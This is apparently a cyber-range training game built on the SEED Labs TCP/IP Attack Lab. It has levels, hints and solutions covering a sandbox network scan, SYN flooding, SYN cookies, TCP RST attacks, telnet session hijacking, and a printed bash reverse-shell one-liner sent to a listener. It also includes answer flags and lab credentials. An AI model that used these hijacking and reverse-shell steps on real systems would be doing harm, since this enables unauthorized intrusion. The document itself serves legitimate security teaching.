title: TCP/IP Attack Lab
description: Hands-on training covering SYN flooding, TCP RST attacks, TCP session hijacking and reverse shells, based on the SEED Labs TCP/IP Attack Lab.
prerequisites: Basic TCP/IP (3-way handshake, sequence/ack numbers, ports)
outcomes: You will understand why TCP's lack of built-in authentication allows SYN flooding, RST, and session-hijacking attacks.
You will be able to perform a SYN flooding attack and explain why SYN cookies mitigate it.
You will be able to perform a TCP RST attack to tear down telnet, SSH and a long-lived streaming connection, and explain why encryption does not prevent it.
You will be able to hijack a live telnet session to inject a command, and chain this into a reverse shell.

levels.title: Introduction
levels.content:
# General information: please read carefully

* This training is directly based on the **SEED Labs TCP/IP Attack Lab** (Wenliang Du). The attached PDF handout is your reference material for the theory behind every attack - keep it open while you work.
* The IP addresses, ports and parameters used in this sandbox are **different from the ones in the PDF handout**. You cannot copy/paste the example values from the PDF; you must adapt every command to this environment.
* The solution of a level **will be required** in later levels. Do not try to skip ahead.
* If you get stuck, you may use the hints (they cost points) or search the attached PDF and online documentation.
* This game is for educational purposes only, performed inside an isolated sandbox you are authorized to attack. Never run these techniques against systems you do not own or have explicit written permission to test.
* Scoring: this training is graded out of **20 points**. Every hint you open has a penalty between **0.5 and 2 points**, deducted from that level's score.

# Storyline intro

You are a security trainee at a small consultancy. Your mentor has set up an isolated practice network with three machines: `attacker` (your machine), `server` and `client`, all on the same LAN - exactly the assumption SEED Labs makes so you can sniff traffic between the client and the server. Your job today is to reproduce, end to end, the classic TCP/IP attacks: SYN flooding, TCP RST, TCP session hijacking, and pivoting a hijacked session into a reverse shell.

levels.title: Get Access
levels.cloud_content:
Your first task is to access the sandbox, where you will complete all following tasks. After you have successfully connected, submit the answer **`start`**.

### Sandbox access
1. In the topology overview on the right, right-click on **`attacker`** and then click on **`Open GUI`**, and a new pop-up window will appear.
2. Login with username **`user`** and password **`Password123`**.

Alternatively, you can use SSH to connect to the machine. SSH access makes it easier to copy-paste commands and flags, but requires more steps to set up. See [documentation](https://docs.platform.cyberrange.cz/user-guide-advanced/sandboxes/sandbox-access/#user-access) for more details.
levels.local_content: This sandbox has not been tested for use with local sandbox.

levels.title: Mapping the LAN
levels.content:
Before attacking anything, you need to know what is actually out there. Your `attacker` machine sits on the `10.1.26.0/24` network together with `server` and `client`, but you don't know their exact IP addresses or which services they run yet.

Scan the subnet and identify:
* the `server` machine (it will be running SSH, a telnet service, and a small custom TCP service),
* the `client` machine (it mostly just talks outbound to the server).

**Note:** the telnet service in this sandbox is **not** on its usual port - this is deliberate so you cannot just reuse the SEED Labs PDF's default assumptions. You need to actually scan for it.

The flag is the port number the telnet service is listening on.
levels.solution:
```
user@attacker:~$ nmap -sV 10.1.26.0/24
...
Nmap scan report for 10.1.26.9 (server)
PORT     STATE SERVICE
22/tcp   open  ssh
2323/tcp open  telnet
9091/tcp open  xmp-one?
...
```
The telnet service is on TCP port **2323**.

hints.title: Which nmap options help here?
hints.content: `-sV` (service/version detection) and scanning the whole subnet at once (`nmap -sV 10.1.26.0/24`) will show you every host and every open port in one pass.

hints.title: The telnet port is not 23
hints.content: Look through the full port list returned by nmap for the server's IP - telnet has deliberately been moved off its default port in this sandbox.

levels.title: Diagnostic access & reading the SYN backlog
levels.content:
Your mentor has set you up with a diagnostic account on the server, `seedlab` / `Att@ckTCP25`, so you can check server-side state after each attack (exactly the way the lab asks you to compare `netstat -na` before and after an attack).

SSH into the server (`10.1.26.9`) with that account and check the size of the queue used for half-opened TCP connections, i.e. the setting the SEED Labs PDF describes in Task 1:
```
sudo sysctl -q net.ipv4.tcp_max_syn_backlog
```

The flag is the value returned. (Note: this sandbox only has Scapy available, not Netwox, and Scapy sends packets much slower - the backlog here is intentionally small so the next level's flood is actually achievable.)
levels.solution:
```
user@attacker:~$ ssh seedlab@10.1.26.9
seedlab@10.1.26.9's password: Att@ckTCP25

seedlab@server:~$ sudo sysctl -q net.ipv4.tcp_max_syn_backlog
net.ipv4.tcp_max_syn_backlog = 8
```

hints.title: How do I log in?
hints.content: Use `ssh seedlab@10.1.26.9` and the password given in the task text.

levels.title: SYN Flooding Attack
levels.content:
Read Task 1 ("SYN Flooding Attack") of the attached SEED Labs TCP/IP Attack Lab PDF. This sandbox only has **Scapy** available (no Netwox) - a skeleton script is already on your `attacker` machine at `/home/user/scripts/synflood_skeleton.py`. Fill in the two `@@@@` values (the server's IP and the telnet port you found during recon) and run it with `sudo python3`.

While the flood is running, SSH into the server with the `seedlab` account and watch the half-open connection queue fill up:
```
watch -n1 'ss -tn state syn-recv | wc -l'
```

Once it stabilizes at the backlog limit you found in the previous level, open a **brand-new, third** terminal on `attacker` and try a completely normal connection:
```
telnet 10.1.26.9 2323
```

The flag is the one word that best describes what this new, legitimate connection attempt does.
levels.solution:
```
user@attacker:~$ sudo python3 /home/user/scripts/synflood_skeleton.py
Sent 2000 spoofed SYN packets to 10.1.26.9:2323

# second terminal, via ssh to the server:
seedlab@server:~$ watch -n1 'ss -tn state syn-recv | wc -l'
8

# third terminal, on attacker, a normal connection attempt:
user@attacker:~$ telnet 10.1.26.9 2323
Trying 10.1.26.9...
(hangs - no SYN-ACK ever comes back, because the backlog queue is full)
```
The new connection attempt times out: the kernel has no free slot left in the half-open connection queue to answer it.

hints.title: The script needs your own recon values
hints.content: Open `/home/user/scripts/synflood_skeleton.py` and replace `DST_IP` and `DST_PORT` with the server's IP and the telnet port you found with nmap - they are not filled in for you.

hints.title: What should the new connection attempt do?
hints.content: With the backlog full and SYN cookies still off, the kernel silently drops new SYNs instead of answering - from the client's point of view the connection just hangs until it gives up.

levels.title: Turning on SYN cookies
levels.content:
SYN cookies are currently **disabled** on the server, which is why your flood worked so well. On the server (via the `seedlab` SSH account), turn SYN cookies on, then repeat the SYN flood from `attacker` and compare `netstat -na` again - the half-opened connection queue should no longer fill up the same way.

The flag is the exact command (with option and value) used to enable SYN cookies.
levels.solution:
```
seedlab@server:~$ sudo sysctl -w net.ipv4.tcp_syncookies=1
net.ipv4.tcp_syncookies = 1
```
Re-running `synflood_skeleton.py` now produces far fewer (or no) persistent `SYN-RECV` entries, because the kernel answers with cryptographically-encoded SYN-ACKs instead of allocating backlog entries.

hints.title: Which sysctl parameter?
hints.content: `sysctl -w parameter=value` sets a kernel parameter live. The parameter you need is `net.ipv4.tcp_syncookies`.

levels.title: TCP RST Attack - telnet
levels.content:
The `client` machine keeps a live telnet session open to the server's telnet service the whole time (it reconnects automatically, so you cannot "use up" it). Read Task 2 of the attached PDF ("TCP RST Attacks on telnet and ssh Connections"). This sandbox only has **Scapy** available - a skeleton script is on your `attacker` machine at `/home/user/scripts/rst_attack_skeleton.py`.

Fill in `TARGET_PORT` with the telnet port you found during recon, then run it. It sniffs one live packet of the session to learn the correct sequence/ack numbers and ports, then sends a spoofed RST. You should observe (e.g. via `tcpdump -i eth0 port 2323`) the connection reset, immediately followed by the client's automatic reconnect.

The flag is the exact destination you targeted, in `ip:port` format.
levels.solution:
```
user@attacker:~$ sudo python3 /home/user/scripts/rst_attack_skeleton.py
Sniffing one packet on port 2323 to learn seq/ack/ports...
RST sent. The connection should now be torn down.
```
Watching `tcpdump -i eth0 port 2323` while this runs shows the existing telnet TCP stream terminating right after the spoofed RST, after which the client machine immediately opens a brand-new connection. The destination you targeted is `10.1.26.9:2323`.

hints.title: Which value do I fill in?
hints.content: `TARGET_PORT` must be the telnet port you discovered with nmap in the recon level, not 23.

hints.title: Why does sniffing one packet matter?
hints.content: A RST packet is only accepted by the receiving TCP stack if its sequence number falls in the right window - you need a real, recent seq/ack pair from the live session, which is why the script sniffs one packet first.

levels.title: TCP RST Attack - SSH
levels.content:
The `client` machine also keeps a persistent SSH session open to the server. Repeat the TCP RST attack (same `/home/user/scripts/rst_attack_skeleton.py` script), this time against that SSH connection (port 22), and observe that it breaks exactly the same way as the unencrypted telnet session did - TCP RST attacks exploit TCP itself, not the application layer, so encryption gives no protection against them.

The flag is the exact destination you targeted, in `ip:port` format.
levels.solution:
```
user@attacker:~$ sudo python3 /home/user/scripts/rst_attack_skeleton.py
```
(with `TARGET_PORT = 22`) The SSH session drops with a `Connection reset by peer` / `kex_exchange_identification` style error on the client side, even though the attacker never saw any of the encrypted SSH payload. The destination you targeted is `10.1.26.9:22`.

hints.title: Same attack, different port
hints.content: Reuse the exact same script as the telnet RST level, just change `TARGET_PORT` to 22.

levels.title: TCP RST Attack - radio stream
levels.content:
Finally, read Task 3 of the attached PDF ("TCP RST Attacks on Video Streaming Applications"). In this sandbox, the server runs a small always-on streaming service instead of a real video site (you already saw it in your nmap scan from the first level), and `client` keeps a permanent connection open to it, just like a user watching a stream.

Disrupt that streaming connection the same way as before.

The flag is the exact destination you targeted, in `ip:port` format.
levels.solution:
```
user@attacker:~$ sudo python3 /home/user/scripts/rst_attack_skeleton.py
```
(with `TARGET_PORT = 9091`) The streaming client's output stops abruptly mid-line and then a brand-new connection starts, exactly like a viewer whose video playback gets interrupted and reloads. The destination you targeted is `10.1.26.9:9091`.

hints.title: Which port is the streaming service on?
hints.content: It was in your very first nmap scan of the server, alongside ssh and telnet (it is **9091**).

levels.title: TCP Session Hijacking
levels.content:
Breaking a connection is noisy and easy to notice. Read Task 4 of the attached PDF ("TCP Session Hijacking"): instead of resetting the telnet session, you will inject a command into it while leaving it alive, exactly as a real attacker would to plant a backdoor unnoticed.

A skeleton script is on your `attacker` machine at `/home/user/scripts/hijack_skeleton.py`. Steps:
1. Fill in `TELNET_PORT` with the port you found during recon.
2. Fill in the injected command (the `@@@@` next to `data =`) with:
```
echo TCPHIJACK-9f41 > /tmp/hijack_proof.txt
```
3. Run the script. It sniffs one in-flight packet to read the session's current sequence/ack numbers and source port, then injects your command without resetting the connection.
4. Confirm the injection worked by SSHing into the server with the `seedlab` diagnostic account and reading `/tmp/hijack_proof.txt`.

The flag is the exact string that gets written into `/tmp/hijack_proof.txt`.
levels.solution:
```
user@attacker:~$ sudo python3 /home/user/scripts/hijack_skeleton.py
Sniffing one in-flight packet on port 2323...
Injected. Confirm over SSH whether the command actually ran on the server.

user@attacker:~$ ssh seedlab@10.1.26.9
seedlab@server:~$ cat /tmp/hijack_proof.txt
TCPHIJACK-9f41
```

hints.title: Where do seq/ack/port come from?
hints.content: The script sniffs one live packet of the ongoing telnet session automatically and reuses its sequence number, ack number and source port - you just have to point it at the right port.

hints.title: What exact command do I need to inject?
hints.content: `echo TCPHIJACK-9f41 > /tmp/hijack_proof.txt` - this is the exact text that must reach the server as TCP payload (replace the `@@@@` after `data =` with it, keeping the quotes).

levels.title: Reverse Shell via TCP Session Hijacking
levels.content:
One injected command is fun, but a real attacker wants persistent, convenient access. Read Task 5 of the attached PDF ("Creating Reverse Shell using TCP Session Hijacking").

1. On `attacker`, start a listener: `nc -lvp 4444`.
2. Edit `/home/user/scripts/hijack_skeleton.py` again (a *new* in-flight packet - your old sequence numbers are now stale) and replace the injected command with a reverse shell one-liner, e.g.:
```
/bin/bash -i > /dev/tcp/10.1.26.23/4444 0<&1 2>&1
```
3. Run the script. Once your listener catches the shell, you will be running as the `victim` account on the server (the same account the hijacked telnet session belongs to). Read its final flag file.

The flag is the content of `~/flag_final.txt` as read through your reverse shell.
levels.solution:
```
user@attacker:~$ nc -lvp 4444

# in a second terminal, after editing the injected command in hijack_skeleton.py:
user@attacker:~$ sudo python3 /home/user/scripts/hijack_skeleton.py

# back in the nc terminal:
Connection from 10.1.26.9 received!
victim@server:~$ cat flag_final.txt
SEED-TCPLAB-FINAL-7e2b9c
```

hints.title: Start the listener first
hints.content: Start `nc -lvp <port>` on `attacker` BEFORE you run the script, otherwise the connection back has nothing to connect to. Use `10.1.26.23` (your own attacker IP) as the callback address.

hints.title: Whose shell do I get, and where is the flag?
hints.content: The hijacked session belongs to the `victim` account, so your reverse shell runs as `victim`. Its home directory contains `flag_final.txt`.
